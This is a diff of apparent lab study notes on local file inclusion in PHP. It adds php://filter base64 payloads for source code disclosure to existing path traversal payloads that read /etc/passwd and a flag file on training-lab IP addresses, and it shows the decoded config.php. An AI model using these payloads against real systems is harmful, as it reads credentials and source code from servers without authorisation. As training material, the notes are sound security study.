@@ -127,3 +127,23 @@ non_existing_directory/../../../etc/passwd/./././<SNIP>././././
 /etc/passwd%00.php
 
 http://83.136.250.104:37680/index.php?language=languages/....//....//....//....//....//flag.txt
+
+# PHP Filters
+# Source Code Disclosure
+
+Code: url
+php://filter/read=convert.base64-encode/resource=config
+http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
+http://83.136.253.251:32633/index.php?language=php://filter/read=convert.base64-encode/resource=configure
+
+# As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier.
+# We can now decode this string to get the content of the source code of config.php, as follows:
+
+echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+
+if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
+  header('HTTP/1.0 403 Forbidden', TRUE, 403);
+  die(header('location: /index.php'));
+}
+
+
